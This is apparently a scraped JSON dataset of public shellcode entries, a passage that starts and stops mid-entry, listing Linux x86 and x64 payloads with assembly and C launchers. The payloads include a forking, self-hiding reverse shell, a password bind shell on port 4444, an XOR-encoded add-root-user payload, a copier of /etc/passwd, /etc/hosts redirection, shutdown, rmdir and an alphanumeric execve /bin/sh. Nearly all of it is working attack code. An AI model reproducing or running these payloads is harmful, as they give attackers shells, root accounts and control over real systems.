\\x51\\xb9\\x48\\x58\\x70\\x74\\xba\\x72\\x68\\x4a\\x35\\x31\\xd1\\x51\\xb9\\x76\\x45\\x56\\x46\\xba\\x3d\\x6b\\x6c\\x76\\x31\\xd1\\x51\\x68\\x66\\x77\\x55\\x57\\x68\\x68\\x70\\x31\\x50\\x68\\x7a\\x59\\x65\\x41\\x68\\x41\\x61\\x41\\x51\\x68\\x49\\x38\\x75\\x74\\x68\\x50\\x4d\\x59\\x68\\x68\\x54\\x42\\x74\\x7a\\x68\\x51\\x2f\\x38\\x54\\x68\\x45\\x36\\x6d\\x67\\x68\\x76\\x50\\x2e\\x73\\x68\\x4e\\x58\\x52\\x37\\x68\\x39\\x4b\\x55\\x48\\x68\\x72\\x2f\\x59\\x42\\x68\\x56\\x78\\x4b\\x47\\x68\\x39\\x55\\x66\\x5a\\x68\\x46\\x56\\x6a\\x68\\x68\\x46\\x63\\x38\\x79\\x68\\x70\\x59\\x6a\\x71\\x68\\x77\\x69\\x53\\x68\\x68\\x6e\\x54\\x67\\x54\\x68\\x58\\x4d\\x69\\x37\\x68\\x2f\\x41\\x6e\\x24\\x68\\x70\\x55\\x6e\\x4d\\x68\\x24\\x36\\x24\\x6a\\xb9\\x73\\x61\\x74\\x67\\xba\\x32\\x2d\\x3d\\x5d\\x31\\xd1\\x51\\x89\\xe1\\xba\\x41\\x41\\x41\\x7f\\xc1\\xea\\x08\\xc1\\xea\\x08\\xc1\\xea\\x08\\xcd\\x80\\x31\\xc0\\xb0\\x46\\x31\\xdb\\x31\\xc9\\xcd\\x80\\x31\\xc0\\xb0\\x46\\x31\\xdb\\x31\\xc9\\xcd\\x80\\x68\\x52\\x55\\x48\\x42\\x68\\x52\\x51\\x49\\x43\\xb9\\x49\\x4b\\x59\\x77\\xba\\x66\\x38\\x31\\x35\\x31\\xd1\\x51\\xb9\\x55\\x55\\x54\\x57\\xba\\x7a\\x37\\x3d\\x39\\x31\\xd1\\x51\\x89\\xe3\\x31\\xc0\\x88\\x43\\x07\\x89\\x5b\\x08\\x89\\x43\\x0c\\xb0\\x0b\\x8d\\x4b\\x08\\x8d\\x53\\x0c\\xcd\\x80\\xb0\\x01\\xb3\\x01\\xcd\\x80\";", "int main(void)", "{", "", "    fprintf(stdout,\"Length: %d\\n\\n\",strlen(sc));", "", "    (*(void(*)()) sc)();", "", "}"]},
{"Title": "Linux/x64 - shutdown -h now Shellcode (64 bytes)", "Author": "Keyman", "Published": ": 2014-09-14", "Platform": "Linux_x86-64", "Download": "http://shell-storm.org/shellcode/files/shellcode-892.php", "View": null, "code": ["; ===================================================================", "; Optimized version of shellcode at:", "; http://shell-storm.org/shellcode/files/shellcode-877.php", "; Author: SLAE64-1351 (Keyman)", "; Date: 14/09/2014", ";", "; Length: 64 bytes (got shorter by 1 byte :D )", ";", "; What's new is that some optimalization was performed on the", "; original code which left some space to do a basic decoding of the", "; command (/sbin/shutdown). Each byte (except the first one) was", "; decremented by 1. The decoder just adds 1 to each byte.", ";", "; ===================================================================", " ", "section .text", "global _start", " ", "_start:", " ", "xor rax, rax                ; clear rax and rdx", "cdq", " ", "; -------------------------------------------------------------------", "; 1. store '-h' on stack", "; -------------------------------------------------------------------", " ", "push rax", "push word 0x682d ;-h", "push rsp", "pop rcx", " ", "; -------------------------------------------------------------------", "; 2. store 'now' on stack", "; -------------------------------------------------------------------", " ", "push rax", "push byte 0x77", "push word 0x6f6e ; now", "push rsp", "pop rbx", " ", "push rax", "push rbx", "push rcx", " ", "; -------------------------------------------------------------------", "; 3. store '/sbin/shutdown' on stack", "; -------------------------------------------------------------------", " ", "push rsp", "pop rsi", " ", "push rax", "jmp shutdown", "cont:", "pop rdi", " ", "push 15", "pop rcx", " ", "do_add:", "    add byte [rdi+rcx], 0x01", "    loop do_add", " ", "push 59", "pop rax", "syscall", " ", "shutdown:", "    call cont", "    c_1: db 0x2f, 0x2e, 0x2e, 0x72, 0x61, 0x68, 0x6d, 0x2e, 0x72, 0x67, 0x74, 0x73, 0x63, 0x6e, 0x76, 0x6d"]},
{"Title": "Linux/x64 - Read /etc/passwd + Write To /tmp/outfile Shellcode (105 bytes)", "Author": "Keyman", "Published": ": 2014-09-14", "Platform": "Linux_x86-64", "Download": "http://shell-storm.org/shellcode/files/shellcode-891.php", "View": null, "code": ["; ===================================================================", "; Optimized version of shellcode at:", "; http://shell-storm.org/shellcode/files/shellcode-867.php", "; Author: SLAE64-1351 (Keyman)", "; Date: 14/09/2014", ";", "; Length: 105 bytes (got shorter by 13 bytes)", ";", "; What's new is that some optimalization was performed on the", "; original code which left some space to do a basic decoding of the", "; file names. Each byte (except the first one) was xor'ed with the", "; value 0x32. The decoder part xor's each byte (except the first)", "; with this very same value.", ";", "; ===================================================================", " ", "section .text", "global _start", " ", "_start:", "        xor rsi, rsi", "        jmp string_1", "cont_1:", "        pop rdi", " ", "        ; decode", " ", "        push 24", "        pop rcx", "decode:", "        xor byte [rdi+rcx], 0x32", "        loop decode", "     ", "        sub byte [rdi+11], 0x41         ; set last byte to 0x00", "        sub byte [rdi+24], 0x41         ; set last byte to 0x00", " ", "        ; open (1)", " ", "        push 2", "        pop rax", "        syscall", " ", "        push rax", "        pop r14             ; source", " ", "        ; open (2)", " ", "        add rdi, 12", "        push 0x66", "        pop rsi", "        push 2", "        pop rax", "        syscall", " ", "        push rax", "        pop r15             ; destination", " ", "        ; read", " ", "        xor rax, rax", "        push r14", "        pop rdi", "        push rsp", "        pop rsi", "        mov dx, 0xFFFF", "        syscall", " ", "        ; write", " ", "        push rax", "        pop rdx", " ", "        push r15", "        pop rdi", " ", "        push 1", "        pop rax", "        syscall", " ", "        ; exit", " ", "        push 60", "        pop rax", "        syscall", " ", "string_1:", "    call cont_1", "    ; first byte stays the original value", "    s_1: db 0x2F, 0x57, 0x46, 0x51, 0x1D, 0x42, 0x53, 0x41, 0x41, 0x45, 0x56, 0x73, 0x1D, 0x46, 0x5F, 0x42, 0x1D, 0x5D, 0x47, 0x46, 0x54, 0x5B, 0x5E, 0x57, 0x73"]},
{"Title": "Linux/x64 - Reverse (127.1.1.1:6969/TCP) Shell (/bin/bash) Shellcode (139 bytes)", "Author": "MadMouse", "Published": ": 2014-09-15", "Platform": "Linux_x86-64", "Download": "http://shell-storm.org/shellcode/files/shellcode-895.php", "View": null, "code": ["/*", "#Title: connect back shellcode that splits from the process it was injected into, and then stays persistent and difficult to remove. It is also very close to invisible due to some interesting effects created by forking, and calling the rdtsc instruction", "#length: 139 bytes", "#Date: 14 September  2014", "#Author: Aaron Yool (aka: MadMouse)", "#tested On: Linux kali 3.14-kali1-amd64 #1 SMP Debian 3.14.5-1kali1 (2014-06-07) x86_64 GNU/Linux", "*/", "", "/*", ";", "; part of my shellcode for noobs lesson series hosted in #goatzzz on", "irc.enigmagroup.org", ";", "; 32bit call: eax args: ebx, ecx, edx, esi, edi, and ebp", ";", "; part of my shellcode for noobs lesson series hosted in #goatzzz on", "irc.enigmagroup.org", ";", "; 32bit call: eax args: ebx, ecx, edx, esi, edi, and ebp", "[bits 32]", "section .text", "global _start", "_start:", "; fork(void);", "    xor eax,eax ; cleanup after rdtsc", "    xor edx,edx ; ....", "    xor ebx,ebx ; cleanup the rest", "    xor ecx,ecx ; ....", "    mov al,0x02", "    int 0x80", "    cmp eax,1    ; if this is a child, or we have failed to clone", "    jl fork        ; jump to the main code", "    jmp exit", "fork:", "; socket(AF_INET, SOCK_STREAM, 0);", "    push eax", "    push byte 0x1 ; SOCK_STREAM", "    push byte 0x2 ; AF_INET", "    mov al, 0x66 ; sys_socketcall", "    mov bl,0x1    ; sys_socket", "    mov ecx,esp", "    int 0x80", "", "; dup2(s,i);", "    mov ebx,eax ; s", "    xor ecx,ecx", "loop:", "    mov al,0x3f    ; sys_dup2", "    int 0x80", "    inc ecx", "    cmp ecx,4", "    jne loop", "", "; connect(s, (sockaddr *) &addr,0x10);", "    push 0x0101017f        ; IP = 127.1.1.1", "    push word 0x391b    ; PORT = 6969", "    push word 0x2        ; AF_INET", "    mov ecx,esp", "", "    push byte 0x10", "    push ecx        ;pointer to arguments", "    push ebx        ; s -> standard out/in", "    mov ecx,esp", "    mov al,0x66", "    int 0x80", "    xor ecx,ecx", "    sub eax,ecx", "    jnz cleanup ; cleanup and start over", "", "; fork(void);", "    mov al,0x02", "    int 0x80", "    cmp eax,1    ; if this is a child, or we have failed to clone", "    jl client    ; jump to the shell", "    xor eax,eax", "    push eax", "    jmp cleanup ; cleanup and start over", "", "client:", "; execve(SHELLPATH,{SHELLPATH,0},0);", "    mov al,0x0b", "    jmp short sh", "load_sh:", "    pop esi", "    push edx ; 0", "    push esi", "    mov ecx,esp", "    mov ebx,esi", "    int 0x80", "", "cleanup:", "; close(%ebx)", "    xor eax,eax", "    mov al,0x6", "    int 0x80", "    pause", "    rdtsc", "    pause", "    jmp _start", "", "exit:", "; exit(0);", "    xor eax,eax", "    mov al,0x1", "    xor ebx,ebx", "    int 0x80", "", "sh:", "    call load_sh", "    db \"/bin/bash\"", "", "*/", "", "const char evil[] =", "\"\\x31\\xc0\\x31\\xd2\\x31\\xdb\\x31\\xc9\\xb0\\x02\\xcd\\x80\\x83\\xf8\\x01\\x7c\\x02\\xeb\\x62\\x50\\x6a\\x01\\x6a\\x02\\xb0\\x66\\xb3\\x01\\x89\\xe1\\xcd\\x80\\x89\\xc3\\x31\\xc9\\xb0\\x3f\\xcd\\x80\\x41\\x83\\xf9\\x04\\x75\\xf6\\x68\\x7f\\x01\\x01\\x01\\x66\\x68\\x1b\\x39\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x53\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x31\\xc9\\x29\\xc8\\x75\\x1b\\xb0\\x02\\xcd\\x80\\x83\\xf8\\x01\\x7c\\x05\\x31\\xc0\\x50\\xeb\\x0d\\xb0\\x0b\\xeb\\x1f\\x5e\\x52\\x56\\x89\\xe1\\x89\\xf3\\xcd\\x80\\x31\\xc0\\xb0\\x06\\xcd\\x80\\xf3\\x90\\x0f\\x31\\xf3\\x90\\xeb\\x8b\\x31\\xc0\\xb0\\x01\\x31\\xdb\\xcd\\x80\\xe8\\xdc\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x62\\x61\\x73\\x68\";", "", "typedef void (*shellcode)(void);", "void main(void)", "{", "    ((shellcode)evil)();", "}"]},
{"Title": "Linux/x64 - Add Root User (shell-storm/leet) + Polymorphic Shellcode (273 bytes)", "Author": "Keyman", "Published": ": 2014-09-21", "Platform": "Linux_x86-64", "Download": "http://shell-storm.org/shellcode/files/shellcode-888.php", "View": null, "code": ["; ===================================================================", "; \"Polymorphic\" version of shellcode at:", "; http://shell-storm.org/shellcode/files/shellcode-658.php", "; Author: SLAE64-1351 (Keyman)", "; Date: 21/09/2014", ";", "; Length: 273 bytes (got shorter by 117 bytes)", ";", "; The original code was optimized. This way it became 240 bytes long.", "; Each byte of the optimized shellcode was XOR'ed with 0xDE. The", "; result was dumped as the encoded shellcode below. A decoder stub", "; was implemented to XOR each byte of \"shellcode\" with 0xDE. (except", "; the first byte). After the decoding is finished execution is", "; passed to the original (decoded) shellcode.", ";", "; ===================================================================", " ", "section .text", "global _start", " ", "_start:", " ", "; -------------------------------------------------------------------", "; Shellcode decoder stub", "; -------------------------------------------------------------------", " ", "    push 1", "    pop rcx", "begin:", "    cmp rcx, 1", "    je begin_sc", "    pop rdi                             ; rdi points to the shellcode", "    push byte 0x78", "    pop rcx", "    add rcx, 0x77", "decode:", "    xor byte [rdi+rcx], 0xDE", "    loop decode", "    jmp shellcode", " ", "begin_sc:", "    dec rcx", "    call begin", " ", "; -------------------------------------------------------------------", "; Encoded shellcode", "; -------------------------------------------------------------------", " ", "shellcode:", "    sc: db 0xEB, 0xBB, 0x81, 0x5E, 0xB1, 0xD5, 0x9F, 0x5E, 0xB1, 0xC6, 0x9F, 0xB4, 0xDC, 0x87, 0xB4, 0xDC, 0x86, 0x8E, 0x8E, 0x80, 0x84, 0xB8, 0x5F, 0x18, 0xD1, 0xDA, 0xB8, 0x5F, 0x1C, 0x5C, 0xDC, 0x8F, 0xD1, 0xDB, 0x87, 0x97, 0x49, 0x96, 0x5D, 0x19, 0xD3, 0x3C, 0x3D, 0x96, 0x21, 0x11, 0x89, 0x80, 0x8E, 0x81, 0xB4, 0xDC, 0x87, 0xB4, 0xF0, 0x9F, 0x80, 0xB4, 0xDF, 0x86, 0x9F, 0x88, 0x84, 0x8F, 0xD1, 0xDB, 0x87, 0x96, 0x5D, 0x18, 0xEE, 0x97, 0x59, 0x21, 0xB4, 0xE5, 0x9F, 0x80, 0x3C, 0x37, 0xB4, 0xDC, 0x87, 0xB4, 0xDD, 0x86, 0x8F, 0xD1, 0xDB, 0x87, 0x97, 0x59, 0x21, 0x3C, 0x2A, 0x96, 0xEF, 0x21, 0xB4, 0xE2, 0x86, 0xD1, 0xDB, 0x36, 0x48, 0x21, 0x21, 0x21, 0xF1, 0xBB, 0xAA, 0xBD, 0xF1, 0xAE, 0xBF, 0xAD, 0xAD, 0xA9, 0xBA, 0x9F, 0xF1, 0xF1, 0xBB, 0xAA, 0xBD, 0xF1, 0xAD, 0xB6, 0xBF, 0xBA, 0xB1, 0xA9, 0x9F, 0xAD, 0xB6, 0xBB, 0xB2, 0xB2, 0xF3, 0xAD, 0xAA, 0xB1, 0xAC, 0xB3, 0xE4, 0xA6, 0xE4, 0xEE, 0xE4, 0xEE, 0xE4, 0xAD, 0xB6, 0xBB, 0xB2, 0xB2, 0xF3, 0xAD, 0xAA, 0xB1, 0xAC, 0xB3, 0xF0, 0xB1, 0xAC, 0xB9, 0xE4, 0xF1, 0xE4, 0xF1, 0xBC, 0xB7, 0xB0, 0xF1, 0xBC, 0xBF, 0xAD, 0xB6, 0xD4, 0xAD, 0xB6, 0xAD, 0xB6, 0xBB, 0xB2, 0xB2, 0xF3, 0xAD, 0xAA, 0xB1, 0xAC, 0xB3, 0xE4, 0xFA, 0xEF, 0xFA, 0xAC, 0xBB, 0x89, 0x9B, 0xE9, 0x99, 0x93, 0xEF, 0xFA, 0xBF, 0xA6, 0xBB, 0x93, 0xB9, 0xE8, 0x92, 0x8A, 0xAD, 0xF1, 0x8E, 0xBA, 0x8D, 0xB9, 0xBD, 0x98, 0x84, 0xEE, 0x8B, 0xED, 0x93, 0xF1, 0xE4, 0xEF, 0xEA, 0xE9, 0xE9, 0xE6, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xD4"]},
{"Title": "Linux/x86 - Add Map (127.1.1.1 google.com) In /etc/hosts Shellcode (77 bytes)", "Author": "Javier Tejedor", "Published": ": 2014-09-25", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-893.php", "View": null, "code": ["/**", "", ";modify_hosts.asm", ";this program add a new entry in hosts file pointing google.com to 127.1.1.1 ", ";author Javier Tejedor", ";date 24/09/2014", "", "global _start", "", "section .text", "", "_start:", "\txor ecx, ecx", "\tmul ecx", "\tmov al, 0x5\t\t", "\tpush ecx", "\tpush 0x7374736f\t\t;/etc///hosts", "\tpush 0x682f2f2f", "\tpush 0x6374652f", "\tmov ebx, esp", "\tmov cx, 0x401 \t\t;permmisions", "\tint 0x80\t\t;syscall to open file", "", "\txchg eax, ebx", "\tpush 0x4", "\tpop eax", "\tjmp short _load_data\t;jmp-call-pop technique to load the map", "", "_write:", "\tpop ecx", "\tpush 20\t\t\t;length of the string, dont forget to modify if changes the map", "\tpop edx", "\tint 0x80\t\t;syscall to write in the file", "", "\tpush 0x6", "\tpop eax", "\tint 0x80\t\t;syscall to close the file", "", "\tpush 0x1", "\tpop eax", "\tint 0x80\t\t;syscall to exit", "", "_load_data:", "\tcall _write", "\tgoogle db \"127.1.1.1 google.com\"", "**/", "", "#include<stdio.h>", "#include<string.h>", "", "unsigned char code[] = \\", "\"\\x31\\xc9\\xf7\\xe1\\xb0\\x05\\x51\\x68\\x6f\\x73\\x74\\x73\\x68\\x2f\\x2f\\x2f\\x68\\x68\\x2f\\x65\\x74\\x63\\x89\\xe3\\x66\\xb9\\x01\\x04\\xcd\\x80\\x93\\x6a\\x04\\x58\\xeb\\x10\\x59\\x6a\\x14\\x5a\\xcd\\x80\\x6a\\x06\\x58\\xcd\\x80\\x6a\\x01\\x58\\xcd\\x80\\xe8\\xeb\\xff\\xff\\xff\\x31\\x32\\x37\\x2e\\x31\\x2e\\x31\\x2e\\x31\\x20\\x67\\x6f\\x6f\\x67\\x6c\\x65\\x2e\\x63\\x6f\\x6d\";", "", "main()", "{", "", "        printf(\"Shellcode Length:  %d\\n\", strlen(code));", "", "        int (*ret)() = (int(*)())code;", "", "        ret();", "", "}"]},
{"Title": "Linux/x64 - Add Map (127.1.1.1 google.lk) In /etc/hosts Shellcode (110 bytes)", "Author": "Osanda Malith Jayathissa", "Published": ": 2014-10-29", "Platform": "Linux_x86-64", "Download": "http://shell-storm.org/shellcode/files/shellcode-896.php", "View": null, "code": ["/*", "; Title: Add map in /etc/hosts file - 110 bytes", "; Date: 2014-10-29", "; Platform: linux/x86_64", "; Website: http://osandamalith.wordpress.com", "; Author: Osanda Malith Jayathissa (@OsandaMalith)", "", "global _start", "    section .text", "", "_start:", "    ;open", "    xor rax, rax ", "    add rax, 2  ; open syscall", "    xor rdi, rdi", "    xor rsi, rsi", "    push rsi ; 0x00 ", "    mov r8, 0x2f2f2f2f6374652f ; stsoh/", "    mov r10, 0x7374736f682f2f2f ; /cte/", "    push r10", "    push r8", "    add rdi, rsp", "    xor rsi, rsi", "    add si, 0x401", "    syscall", "", "    ;write", "    xchg rax, rdi", "    xor rax, rax", "    add rax, 1 ; syscall for write", "    jmp data", "", "write:", "    pop rsi ", "    mov dl, 19 ; length in rdx", "    syscall", "", "    ;close", "    xor rax, rax", "    add rax, 3", "    syscall", "", "    ;exit", "    xor rax, rax", "    mov al, 60", "    xor rdi, rdi", "    syscall ", "", "data:", "    call write", "    text db '127.1.1.1 google.lk'", "*/", "", "#include <stdio.h>", "#include <string.h>", "", "unsigned char code[] =  \"\\x48\\x31\\xc0\\x48\\x83\\xc0\\x02\\x48\"", "                        \"\\x31\\xff\\x48\\x31\\xf6\\x56\\x49\\xb8\"", "                        \"\\x2f\\x65\\x74\\x63\\x2f\\x2f\\x2f\\x2f\"", "                        \"\\x49\\xba\\x2f\\x2f\\x2f\\x68\\x6f\\x73\"", "                        \"\\x74\\x73\\x41\\x52\\x41\\x50\\x48\\x01\"", "                        \"\\xe7\\x48\\x31\\xf6\\x66\\x81\\xc6\\x01\"", "                        \"\\x04\\x0f\\x05\\x48\\x97\\x48\\x31\\xc0\"", "                        \"\\x48\\x83\\xc0\\x01\\xeb\\x18\\x5e\\xb2\"", "                        \"\\x13\\x0f\\x05\\x48\\x31\\xc0\\x48\\x83\"", "                        \"\\xc0\\x03\\x0f\\x05\\x48\\x31\\xc0\\xb0\"", "                        \"\\x3c\\x48\\x31\\xff\\x0f\\x05\\xe8\\xe3\"", "                        \"\\xff\\xff\\xff\\x31\\x32\\x37\\x2e\\x31\"", "                        \"\\x2e\\x31\\x2e\\x31\\x20\\x67\\x6f\\x6f\"", "                        \"\\x67\\x6c\\x65\\x2e\\x6c\\x6b\";", "", "", "int", "main() {", "    printf(\"Shellcode Length:  %d\\n\", (int)strlen(code));", "    int (*ret)() = (int(*)())code;", "    ret();", "", "}", "/*EOF*/"]},
{"Title": "Linux/x64 - execve(\"/bin/sh\\0\",NULL,NULL) + Position Independent + Alphanumeric Shellcode (87 bytes)", "Author": "Breaking.Technology", "Published": ": 2014-11-10", "Platform": "Linux_x86-64", "Download": "https://old.exploit-db.com/download/35205.asm", "View": "https://old.exploit-db.com/raw/35205/", "code": ["#Title: Position independent & Alphanumeric 64-bit execve(\"/bin/sh\\0\",NULL,NULL); (87 bytes)", "#Author: Breaking.Technology", "#Date: 06 November 2014", "#Vendor Homepage: http://breaking.technology", "#Version: x86-64 platforms", "#Classification: 64 bit shellcode", "#Shellcode: http://breaking.technology/shellcode/alpha64-binsh.txt", "", "#    Position independent & Alphanumeric 64-bit execve(\"/bin/sh\\0\",NULL,NULL); (87 bytes)", "# This shellcode will successfully execute every time as long as it is returned to.", "#                        (c) 2014 Breaking Technology, Inc.                        ", "#                           http://breaking.technology/                            ", "#", "# Assembled (87 bytes): ", "# XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V", "#", "# Assembly: ", "# user@host $ as alpha64-binsh.s -o alpha64-binsh.o ; strings alpha64-binsh.o", ".section .data", ".section .text", ".globl _start", "", "_start:                     # \"XX\"", "  pop %rax                  # 'X' add $0x8, %rsp  ; so we dont overwrite the return pointer", "  pop %rax                  # 'X' add $0x8, %rsp  ; so we dont overwrite the return pointer", "", "prepare_ff:                 # \"j0TYX45Pk13\"", "  push $0x30                # 'j0'", "  push %rsp                 # 'T'", "  pop %rcx                  # 'Y'   %rcx points to $0x30", "  pop %rax                  # 'X'   %rax   = 0x30", "  xor $0x35, %al            # '45'  %rax   = 0x05", "  push %rax                 # 'P'   (%rcx) = 0x05", "  imul $0x33, (%rcx), %esi  # 'k13' %esi = 0x000000ff", "", "prepare_f8:                 # \"VX4047\"", "  # mov %rsi, %rax", "  push %rsi                 # 'V'  ", "  pop %rax                  # 'X'    %rax = %rsi = 0x000000ff", "", "  # mov $0xf8, %al", "  xor $0x30, %al            # '40'", "  xor $0x37, %al            # '47'   %rax = 0x000000f8", "", "write_negative_8:           # \"3At1At1qu1qv1qw\"", "  # mov %eax, 0x74(%rcx)", "  xor 0x74(%rcx), %eax      # '3At'", "  xor %eax, 0x74(%rcx)      # '1At' 0xf8", "", "  # mov %sil, 0x75 - 0x77 + rcx", "  xor %esi, 0x75(%rcx)      # '1qu' 0xff", "  xor %esi, 0x76(%rcx)      # '1qv' 0xff", "  xor %esi, 0x77(%rcx)      # '1qw' 0xff", "", "  # -8 is now on the stack as a 32-bit dword", "  # at 0x74(%rcx)", "", "read_negative_8:            # \"Hcyt\"", "  # move long (dword) to signed quadword", "  # mov -8, %rdi", "  movslq 0x74(%rcx), %rdi   # 'Hcyt' %rdi is now -0x8 ( 0xfffffffffffffff8 )", "", "get_return_pointer:         # \"14yH34y\"", "  # mov -0x10(%rcx), %rsi   <--- THIS IS OUR RETURN POINTER / LOCATION OF short_pc_rsi", "  # OR IN DECIMAL:", "  # mov -16(%rcx), %rsi", "  xor %esi, (%rcx, %rdi, 2) # '14y'", "  xor (%rcx, %rdi, 2), %rsi # 'H34y'", "", "prepare_key:                # \"hj5XVX\"", "  # put the xor key into %eax", "  push $0x5658356a          # 'hj5XV' pushed backwards because x86 stack.", "  pop %rax                  # 'X'", "", "decode_encoded_code:        # \"1FK\"", "  xor %eax, 0x4b(%rsi)      # '1FK'  encoded_code       ; pops & syscall decoded", "", "decode_encoded_data:        # \"1FSH3FO\"", "  xor %eax, 0x53(%rsi)      # '1FS'  encoded_data + 4  ; \"/sh\\0\" decoded", "  xor 0x4f(%rsi), %rax      # 'H3FO' encoded_data      ; \"/bin/sh\\0\" now in %rax", "", "begin_stack_setup:          # \"PT\"", "  push %rax                 # 'P' push \"/bin/sh\\0\"", "  push %rsp                 # 'T' push pointer to /bin/sh", "  ", "", "zero_rax:                   # \"j0X40\"", "  # xor %rax, %rax", "  push $0x30                # 'j0'", "  pop %rax                  # 'X'", "  xor $0x30, %al            # '40' %rax is NULL", "", "end_stack_setup:            # \"PP\"", "  push %rax                 # 'P' push NULL", "  push %rax                 # 'P' push NULL", "", "", "mov_3b_al:                  # \"4u4N\"", "  # mov $0x3b, %al", "  xor $0x75, %al            # '4u'", "  xor $0x4e, %al            # '4N' %al = 0x4e xor 0x75 =  $0x3b", "                            #            this is for syscall ^ ", "begin_stack_run:            # \"Z\"", "  pop %rdx                  # 'Z' mov $0x00, %rdx ; %rdx = NULL", "", "", "encoded_code:               # \"4jWS\" ", "                            #  0x34 0x6a 0x57 0x53 ", "                            # AFTER XOR MAGIC:", "  .byte 0x34                # \"\\x5e\" pop %rsi     ; %rsi = NULL", "  .byte 0x6a                # \"\\x5f\" pop %rdi     ; %rdi = pointer to \"/bin/sh\\0\"", "  .byte 0x57                # \"\\x0f\"", "  .byte 0x53                # \"\\x05\" syscall      ; execve(\"/bin/sh\\0\",NULL,NULL);", "", "  # syscall(%rax) = function(%rdi,%rsi,%rdx);", "  # syscall(0x3b) = execve(\"/bin/sh\\0\",NULL,NULL);", "", "", "encoded_data:               # \"EW18EF0V\" turns into \"/bin/sh\\0\"", "                            # 0x45 0x57 0x31 0x38 0x45 0x46 0x30 0x56", "                            # AFTER XOR MAGIC:", "  .byte 0x45                #  /", "  .byte 0x57                #  b", "  .byte 0x31                #  i", "  .byte 0x38                #  n", "  .byte 0x45                #  /", "  .byte 0x46                #  s", "  .byte 0x30                #  h", "  .byte 0x56                #  \\0"]},
{"Title": "Linux/x86 - rmdir() Shellcode (37 bytes)", "Author": "kw4", "Published": ": 2014-12-11", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/35519.c", "View": "https://old.exploit-db.com/raw/35519/", "code": ["/*", "", "Title:  Linux x86  rmdir - 37 bytes", "Author:  kw4 <kw4.nop@gmail.com>", "useful for testing purposes", "", "", " 08048060 <_start>:", " 8048060:       31 c0                     xor    %eax,%eax", " 8048062:       50                          push   %eax", " 8048063:       68 6f 6c 68 6f          push   $0x6f686c6f", " 8048068:       68 68 6f 6c 68         push   $0x686c6f68", " 804806d:       68 2f 68 6f 6c          push   $0x6c6f682f", " 8048072:       68 2f 74 6d 70         push   $0x706d742f", " 8048077:       89 e3                      mov    %esp,%ebx", " 8048079:       b0 28                      mov    $0x28,%al", " 804807b:       cd 80                      int    $0x80", " 804807d:       31 c0                      xor    %eax,%eax", " 804807f:        89 c3                      mov    %eax,%ebx", " 8048081:       b0 01                      mov    $0x1,%al", " 8048083:       cd 80                      int    $0x80", "", "*/", "", "#include<stdio.h>", "#include<string.h>", "", "unsigned char code[] = \\", "", "\"\\x31\\xc0\\x50\\x68\\x6f\\x6c\\x68\\x6f\\x68\\x68\\x6f\\x6c\\x68\\x68\\x2f\\x68\\x6f\\x6c\\x68\\x2f\\x74\\x6d\\x70\\x89\\xe3\\xb0\\x28\\xcd\\x80\\x31\\xc0\\x89\\xc3\\xb0\\x01\\xcd\\x80\";", "", "main() {", "", "        printf(\"Shellcode Length:  %d\\n\", strlen(code));", "        int (*ret)() = (int(*)())code;", "        ret();", "}"]},
{"Title": "Linux/x64 - Bind (4444/TCP) Shell (/bin/sh) + Password (Z~r0) + Null-Free Shellcode (81/96 bytes)", "Author": "Sean Dillon", "Published": ": 2014-12-22", "Platform": "Linux_x86-64", "Download": "https://old.exploit-db.com/download/35586.c", "View": "https://old.exploit-db.com/raw/35586/", "code": ["/* ", "* Author:           Sean Dillon", "* Copyright:        (c) 2014 CAaNES, LLC. (http://caanes.com)", "* Release Date:     December 19, 2014", "*", "* Description:      x64 Linux null-free TCP bind port shellcode, optional 4 byte password", "* Assembled Size:   81 bytes, 96 with password", "* Tested On:        Kali 1.0.9a GNU/Linux 3.14.5-kali1-amd64 x86_64", "* License:          http://opensource.org/license/MIT", "* ", "* Build/Run:        gcc -m64 -z execstack -fno-stack-protector bindshell.c -o bindshell.out", "*                   ./bindshell.out &", "*                   nc localhost 4444", "*/", "", "/* ", "* NOTE: This C code binds on port 4444 and does not have the password option enabled.", "* The end of this file contains the .nasm source code and instructions for building from that.", "*/", "", "#include <stdio.h>", "#include <string.h>", "", "unsigned char shellcode[] = ", "\t\"\\x31\\xf6\"                      /* xor    %esi,%esi */", "\t\"\\xf7\\xe6\"                      /* mul    %esi */", "\t\"\\xff\\xc6\"                      /* inc    %esi */", "\t\"\\x6a\\x02\"                      /* pushq  $0x2 */", "\t\"\\x5f\"                          /* pop    %rdi */", "\t\"\\x04\\x29\"                      /* add    $0x29,%al */", "\t\"\\x0f\\x05\"                      /* syscall */", "\t\"\\x50\"                          /* push   %rax */", "\t\"\\x5f\"                          /* pop    %rdi */", "\t\"\\x52\"                          /* push   %rdx */", "\t\"\\x52\"                          /* push   %rdx */", "\t\"\\xc6\\x04\\x24\\x02\"              /* movb   $0x2,(%rsp) */", "\t\"\\x66\\xc7\\x44\\x24\\x02\\x11\\x5c\"  /* movw   $0x5c11,0x2(%rsp) */", "\t\"\\x54\"                          /* push   %rsp */", "\t\"\\x5e\"                          /* pop    %rsi */", "\t\"\\x52\"                          /* push   %rdx */", "\t\"\\x6a\\x10\"                      /* pushq  $0x10 */", "\t\"\\x5a\"                          /* pop    %rdx */", "\t\"\\x6a\\x31\"                      /* pushq  $0x31 */", "\t\"\\x58\"                          /* pop    %rax */", "\t\"\\x0f\\x05\"                      /* syscall */", "\t\"\\x5e\"                          /* pop    %rsi */", "\t\"\\xb0\\x32\"                      /* mov    $0x32,%al */", "\t\"\\x0f\\x05\"                      /* syscall */", "\t\"\\xb0\\x2b\"                      /* mov    $0x2b,%al */", "\t\"\\x0f\\x05\"                      /* syscall */", "\t\"\\x50\"                          /* push   %rax */", "\t\"\\x5f\"                          /* pop    %rdi */", "\t\"\\x6a\\x03\"                      /* pushq  $0x3 */", "\t\"\\x5e\"                          /* pop    %rsi */", "\t\"\\xff\\xce\"                      /* dec    %esi */", "\t\"\\xb0\\x21\"                      /* mov    $0x21,%al */", "\t\"\\x0f\\x05\"                      /* syscall */", "\t\"\\x75\\xf8\"                      /* jne    35 <dupe_loop> */", "\t\"\\x56\"                          /* push   %rsi */", "\t\"\\x5a\"                          /* pop    %rdx */", "\t\"\\x56\"                          /* push   %rsi */", 